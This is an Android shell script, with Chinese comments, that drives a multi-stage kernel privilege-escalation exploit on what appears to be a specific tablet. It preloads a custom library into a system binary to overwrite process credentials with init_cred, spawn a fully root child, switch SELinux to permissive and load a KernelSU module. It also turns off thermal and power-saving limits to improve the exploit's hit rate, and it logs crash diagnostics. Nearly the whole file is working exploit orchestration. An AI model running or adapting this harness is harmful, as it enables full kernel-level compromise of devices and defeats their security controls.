#!/system/bin/sh
# mt49: 双写两阶段 — 一进程一写 (crash#2 教训, pstore 实锤见 PRIOCHAIN_VERDICT)
#   阶段R: fork 子进程 + 写 real_cred=init_cred  (独立进程, RETRY=1)
#   阶段C: 外部模式写 cred=init_cred            (独立进程, RETRY=1, PSELECT_TASK)
#   两写落地 → real==cred==init_cred → commit_creds 的 BUG_ON cmp 相等 →
#   子进程 gate(满帽 AND euid==0) 触发 → setresgid/setresuid 安全 → 全套 root
# 同进程多 attempt 已判死 (pstore): 二触后任何 sched_setattr → prio_chain 在
# 毒树上踩中 +0x1788 断言 (top_waiter->lock != lock) → brk#0x800。一进程一写
# 则时序/进程/引用三重隔离, 结构性免疫。
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt49.so
DST=/data/local/tmp/preload.so
KO=/data/local/tmp/kernelsu.ko
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt49_root.txt
RUNLOG=/data/local/tmp/mt49_run_$$.out
STATUS=/data/local/tmp/mt49_child_status.txt
rm -f $DST; cp $SRC $DST; sync
BID0=$(cat /proc/sys/kernel/random/boot_id)
rm -f /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt $STATUS
echo "boot_before=$BID0" > $LOG
am kill-all 2>&1 | tail -1 >> $LOG

getfield() { grep -o "$1=[0-9a-f]*" $STATUS 2>/dev/null | cut -d= -f2 | head -1; }

# logenv: 每轮触发前记环境 (裁 热窗/省电/hotplug 假说, 见 FREQ_DIAGNOSIS §二/§四)
logenv() {
  BL=$(dumpsys battery 2>/dev/null | grep -m1 -i 'level' | grep -o '[0-9]*')
  echo "env[$(date +%H:%M:%S)] load=$(cat /proc/loadavg 2>/dev/null) \
batt=${BL:-NA} lowpower=$(settings get global low_power 2>/dev/null) \
freq0=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null) \
freq1=$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq 2>/dev/null) \
on1=$(cat /sys/devices/system/cpu/cpu1/online 2>/dev/null || echo NA) \
on2=$(cat /sys/devices/system/cpu/cpu2/online 2>/dev/null || echo NA) \
thermal=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)" >> $LOG
}

# freqgate v2 (FREQ_DIAGNOSIS §五): 不再闸门/跳轮 (16:02 实证 clamp 在 round
# 起跑 3s 后落下, 轮前闸门护不住轮中). 改为: 每轮重发 framework 保频 (幂等,
# shell 持 DEVICE_POWER, 重启即逆) + cur 配对采样记录. 任何路径必留一行日志
# (v1 零输出的教训). scaling_max_freq 是 system:system 组文件读不到, 弃用.
freqgate() {
  cmd power set-fixed-performance-mode-enabled true >/dev/null 2>&1
  cmd thermalservice override-status 0 >/dev/null 2>&1
  cmd power set-adaptive-power-saver-enabled false >/dev/null 2>&1
  c0=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null)
  c1=$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq 2>/dev/null)
  echo "freqgate[$(date +%H:%M:%S)] post-perflock cur0=$c0 cur1=$c1" >> $LOG
  return 0
}

# ---------- R0: 判活 (3 轮) — SKIP_R0=1 可跳过 (模式C策略) ----------
# R0✅ 按设计=崩一台(牺牲boot+脚本中断)。判活连灭日: STAGE-R 落地自带无崩
# 判活(状态文件 CapEff)且是实质进展 → SKIP_R0=1 直接跑后续; R0 降级为
# "STAGE-R 4轮全灭后的诊断手段"。用法: SKIP_R0=1 sh test_mt49_root.sh
R0OK=0
if [ "$SKIP_R0" = "1" ]; then
  echo "R0 skipped (SKIP_R0=1): STAGE-R self-evidencing, R0 as fallback diag" >> $LOG
else
for R0N in 1 2 3; do
  logenv
  freqgate
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a60bb0 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "R0 round=$R0N rc=$? boot_id=$BID" >> $LOG
  if [ "$BID" != "$BID0" ]; then R0OK=1; echo "R0: ALIVE (round=$R0N)" >> $LOG; break; fi
  sleep 3
done
[ $R0OK -eq 1 ] || { echo "!! R0 3轮全灭 — 原语未激活, 换 boot (或 SKIP_R0=1 让 STAGE-R 自证)" >> $LOG; exit 1; }
fi

# ---------- ENF: 翻 Permissive — 默认撤编 (THERMAL_RESPONSE §三, ENF_ENABLE=1 回滚) ----------
# 撤编理由: (a) 15:30 ENF round2 在 clamp 下崩了 (今天唯一 ENF 崩, 历史 16 次实验
# ENF 从未崩); (b) 纯冗余 — sel_write_enforce 只查 cred->security 的 SID
# (MT47_ROUTE_DECISION 自证), STAGE-C 后主观 cred=init_cred → SID=kernel_t →
# 子进程 main.c:896 的 setenforce 直接合法. ENF_ENABLE=1 恢复旧流程.
if [ "$ENF_ENABLE" = "1" ]; then
for E in 1 2 3; do
  EF=$(getenforce 2>/dev/null)
  case "$EF" in *ermissive*) break;; esac
  logenv
  freqgate
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a41b90 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "ENF round=$E rc=$? enforce=$(getenforce)" >> $LOG
  sleep 3
done
echo "ENF final=$(getenforce)" >> $LOG
else
  echo "ENF skipped (default): post-root setenforce via kernel SID (main.c mt28g); ENF_ENABLE=1 to restore" >> $LOG
fi

KOARG=""
[ -f $KO ] && KOARG="PSELECT_KO=$KO" && echo "ko found: $KO" >> $LOG

# ---------- STAGE-R: real_cred → init_cred ----------
# 第 1 轮 fork 子进程(存活 8min, 持续写状态文件); 未落地则外部模式补打(幂等)
# 单发命中 ~20-40% → 4 轮累计 59-87%; 每轮独立进程, 不破一进程一写
for RA in 1 2 3 4; do
  logenv
  freqgate
  rm -f $RUNLOG
  TASKARG=""
  [ $RA -gt 1 ] && TASKARG="PSELECT_TASK=$(getfield task)"
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_PTR_MODE=1 \
    PSELECT_PTR_STAGE=R \
    PSELECT_PTR_STRICT=1 \
    $TASKARG \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "STAGE-R round=$RA rc=$? $TASKARG" >> $LOG
  grep -a 'mt48:\|mt49:\|mt28m:\|mt33:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  for PS in /sys/fs/pstore/console-ramoops-0; do
    [ -f $PS ] && { echo "--- pstore tail ---" >> $LOG; tail -40 $PS >> $LOG 2>/dev/null; }
  done
  sleep 2
  CAPE=$(getfield CapEff)
  echo "STAGE-R round=$RA CapEff=$CAPE" >> $LOG
  case "$CAPE" in
    *1fffff*) echo "★★★ STAGE-R LANDED (real_cred=init_cred) round=$RA ★★★" >> $LOG; break;;
  esac
  # 状态文件没有 task 地址 → 子进程没起来, 重跑 fork 模式
  [ -z "$(getfield task)" ] && [ $RA -lt 4 ] && continue
done
CAPE=$(getfield CapEff)
case "$CAPE" in
  *1fffff*) : ;;
  *) echo "!! STAGE-R 4轮未落地 — 若本轮 SKIP_R0=1: 先补一轮 R0 诊断(活→PTR几何没中,继续; 灭→换 boot)" >> $LOG; exit 1 ;;
esac

# ---------- STAGE-C: cred → init_cred (外部模式, 同一子进程) ----------
TASK=$(getfield task)
echo "STAGE-C task=$TASK" >> $LOG
for CA in 1 2 3 4; do
  logenv
  freqgate
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_PTR_MODE=1 \
    PSELECT_PTR_STAGE=C \
    PSELECT_PTR_STRICT=1 \
    PSELECT_TASK=$TASK \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "STAGE-C round=$CA rc=$?" >> $LOG
  grep -a 'mt48:\|mt49:\|mt28m:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  for PS in /sys/fs/pstore/console-ramoops-0; do
    [ -f $PS ] && { echo "--- pstore tail ---" >> $LOG; tail -40 $PS >> $LOG 2>/dev/null; }
  done
  [ -f /data/local/tmp/root_alive.txt ] && echo "★★★ ROOT-ALIVE round=$CA: $(cat /data/local/tmp/root_alive.txt) ★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && echo "★★★★ KSU-LOADED round=$CA ★★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && break
  [ -f /data/local/tmp/root_alive.txt ] && break
  sleep 2
  EUID_V=$(getfield euid)
  echo "STAGE-C round=$CA euid=$EUID_V status=$(cat $STATUS 2>/dev/null)" >> $LOG
done

sleep 5
echo "=== final uid=$(id -u) enforce=$(getenforce) root_alive=$([ -f /data/local/tmp/root_alive.txt ] && echo YES || echo no) ksu=$([ -f /data/local/tmp/ksu_done.txt ] && echo YES || echo no) ===" >> $LOG
echo "=== DONE $(date +%H:%M:%S) ===" >> $LOG

# 判读:
#  STAGE-R CapEff 满帽 → R 落地; STAGE-C 后 root_alive.txt → uid 全套 root;
#  ksu_done.txt → 模块加载成功, 项目毕业
#  任一阶段 3 轮全灭 → 换 boot 重跑 (本 boot 原语疲劳)
